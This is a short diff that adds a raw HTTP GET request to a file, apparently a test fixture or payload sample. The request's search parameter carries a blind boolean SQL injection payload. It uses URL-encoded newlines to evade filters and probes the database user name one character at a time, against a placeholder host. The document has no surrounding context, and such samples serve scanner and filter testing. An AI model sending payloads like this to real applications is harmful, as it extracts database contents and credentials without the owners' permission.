@@ -1,0 +1,4 @@
+GET /a?search=1'%0aand%0aascii(substring(user(),1,1))>64%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
